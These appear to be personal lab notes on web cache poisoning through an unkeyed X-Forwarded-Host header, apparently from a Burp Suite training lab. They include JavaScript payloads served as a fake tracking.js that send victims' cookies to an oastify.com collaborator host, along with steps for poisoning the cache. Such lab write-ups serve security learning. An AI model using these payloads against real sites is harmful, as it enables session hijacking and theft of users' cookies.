___

Watch for `/resources/js/tracking.js` file and `X-Cache: hit` header in response.
If you got only tracking.js without X-Cache - no cache poisoning here.

![[Pasted image 20240808103007.png]]

If you got both file and header, the first thing you should try is to inject your exploit server into **Host:** or **X-Forwarded-Host:** headers and check them in response

![[Pasted image 20240808103015.png]]

You got the poisoned cache with X-Forwarded-Host? Cool, now go to your exploit server, set the File name /resources/js/tracking.js and in Body section paste the next payload: `document.write('<img src="http://burp.oastify.com?c='+document.cookie+'" />')`. Poison web cache with your server and wait for victim's cookies.

```js
document.location='https://OASTIFY.COM/?cookies='+document.cookie;
```

# Web cache poisoning with an unkeyed header

The application supports the use of a custom HTTP header to override the Host header, and uses a cache that can be manipulated into saving responses that have been influenced by this header.  
  
Burp added the following headers to the request:  
  
X-Forwarded-Host: wvv7qb16dsbmfio5z8d5hum5bwhp5gt9uxkka8z.oastify.com  
X-Host: wvv7qb16dsbmfio5z8d5hum5bwhp5gt9uxkka8z.oastify.com  
X-Forwarded-Server: wvv7qb16dsbmfio5z8d5hum5bwhp5gt9uxkka8z.oastify.com


![[Pasted image 20240808105803.png]]

## Cookie steal

X-Forwarded-Host: exploit-0ab30085047ba7ec862a98ec018d0091.exploit-server.net

Exploit server: 
	File: /resources/js/tracking.js
	Body: document.location='http://00ytfwduj1605olk3s3bahg31u7mvb.oastify.com/?cookies='+document.cookie;

![[Pasted image 20240808112148.png]]



